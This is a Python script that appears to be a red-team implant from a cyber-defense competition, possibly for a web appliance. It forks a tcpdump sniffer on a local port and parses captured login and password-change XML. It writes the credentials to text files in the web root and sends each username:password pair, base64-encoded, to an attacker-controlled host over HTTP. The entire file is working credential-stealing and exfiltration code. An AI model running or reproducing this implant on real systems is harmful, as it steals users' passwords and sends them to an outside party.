#!/usr/bin/python

import sys
from base64 import b64encode
import httplib
import os
import re
from xml.dom.minidom import parse, parseString
import string
import time



#Exfiltration Variables from auxiliary/server/capture/http_basic
HOST = "suspiciouslow.isamotherfucking.ninja"
#fallback = "192.168.3.3"
fallback = "10.0.0.100"
PORT = "8080"
URI = "/robots.txt"
START_TIME = int(time.time())

#Returns IP Address of HOST or False (uses Google DNS)
def dnslookup():
	#Removed Target for MACCDC
	#IP = os.popen("dig @8.8.8.8 +short "+ HOST + " 2>/dev/null").read()
	IP = os.popen("dig +short "+ HOST + " 2>/dev/null").read()
	matched = re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", IP)
	if not matched:
		#Removed Target for MACCDC
		#IP = os.popen("dig @8.8.4.4 +short "+ HOST + " 2>/dev/null").read()
		IP = os.popen("dig +short "+ HOST + " 2>/dev/null").read()
		matched = re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", IP)
		if not matched:
			return fallback
		else:
			return IP.strip()
	else:
		return IP.strip()

#Send Most Recent Cred Each Hour
def send_recent():
	global START_TIME
	current_time = int(time.time())
	if ( (current_time-START_TIME) > 3600 ): #Every Hour
		try:
			fin = open('/var/appweb/htdocs/passwords.txt','r')
			change = fin.readlines()[-1]
			if '<password>' in change:
				process_password(change)
			if 'chpass-request' in change:
				process_chpass(change)
			fin.close()
		except:
			pass
		START_TIME = current_time


#Processes the username/password in the XML with <username></username><password></password> format
#Example String:
#<request cmd="op" cookie="1363937236382439" username="testuser"><operations><request><password-hash><username>testuser</username><password>newpass</password></password-hash></request></operations></request>
def process_password(xml):
	IP = dnslookup()
	if IP:	#Phone it home

		document = parseString(xml)
		usertag = document.getElementsByTagName("username")[0]
		username = usertag.firstChild.data
		passtag = document.getElementsByTagName("password")[0]
		password = passtag.firstChild.data
		creds = b64encode(username+":"+password)
		header = {"Authorization": "Basic " + creds}
		conn = httplib.HTTPConnection(IP, PORT)
		conn.request("GET", URI, "", header)
		conn.close()


#Processes the username/password in the XML call <chpass-request format
#Example String:
#<chpass-request cookie="123456789012" username="admin" newpasswd="test" oldpasswd="changme" ip-address="::ffff:192.168.2.7"></chpass-request>
def process_chpass(xml):

	IP = dnslookup()
	if IP:	#Phone it home
		document = parseString(xml)
		request = document.getElementsByTagName("chpass-request")[0]
		username = request.getAttribute("username")
		password = request.getAttribute("newpasswd")
		creds = b64encode(username+":"+password)
		header = {"Authorization": "Basic " + creds}
		conn = httplib.HTTPConnection(IP,PORT)
		conn.request("GET", URI, "", header)
		conn.close()



#Cleans and returns just the XML in the string
#May return nothing if data doesn't contain < > type data
def clean_data(data):
	printable = set(string.printable)
	asciidata = filter(lambda x: x in printable, data)
	sanitized = False
	while(not sanitized):
		splitpieces = asciidata.split("<",1)
		if len(splitpieces) != 2:
			return False
		frontstripped = "<" + splitpieces[1]
		flipped = frontstripped[::-1]
		splitpieces = flipped.split(">",1)
		if len(splitpieces) != 2:
			return False
		flippedstripped = ">" + splitpieces[1]
		xml = flippedstripped[::-1]
		try:
			parseString(xml) #We're trying to parse it to check for errors
			sanitized = True #Shouldn't get here unless the XML is clean
		except:
			if (xml == "" ): #Ran out of data
				return False
			asciidata = xml[1:] #Loop again, but remove the leading <
	return xml

#Writes XML to passwords.txt in webroot
def log_password(xml):
	fout = open('/var/appweb/htdocs/passwords.txt','a')
	fout.write(xml)
	fout.write("\n")
	fout.close()

#Writes XML to changes.txt in webroot
def log_change(xml):
	fout = open('/var/appweb/htdocs/changes.txt','a')
	fout.write(xml)
	fout.write("\n")
	fout.close()


#If either of these fails, I just assume crash out so the re-install will re-run it.
pipe_r, pipe_w = os.pipe()

pid = os.fork()

if(pid != 0): #Parent
	#DUP OUTPUT to pipe
	#Copy our pipe_w fd to stdout so that anything going to stdout will now go to the pipe.
	os.dup2(pipe_w, 1)
	#Become TCPDUMP
	port_string = '(port 10000)'
	#tcpdump -nns 0 -A -l -i any '(port 80)'
	os.execlp('tcpdump','-nn','-s','0','-A','-l', '-i', 'lo', port_string)

else: #Child
	#DUP INPUT to pipe
	#Copy our pipe_r fd to stdin so that anything from stdin can be read from the pipe.
	os.dup2(pipe_r, 0)

	while(True):
		#READ from standard in
		data = sys.stdin.readline()
		#Process normally

		try:
			xml = clean_data(data)
		except: #Data didn't parse right
			continue

		if not xml: #Loop if xml is False
			continue

		if not isinstance(xml, str): #Somehow, we returned a non-string object
			continue

		if (string.find(xml, '<password>') != -1):
			try:
				log_password(xml)
			except: #Couldn't log password, keep going
				pass
			try:
				process_password(xml)
			except: #Couldn't process password, keep going
				pass

		if (string.find(xml, 'chpass-request') != -1):
			try:
				log_password(xml)
			except: #Couldn't log password, keep going
				pass
			try:
				process_chpass(xml)
			except: #Couldn't process password, keep going
				pass

		try:
			log_change(xml)
		except: #Couldn't log change, keep going
			pass



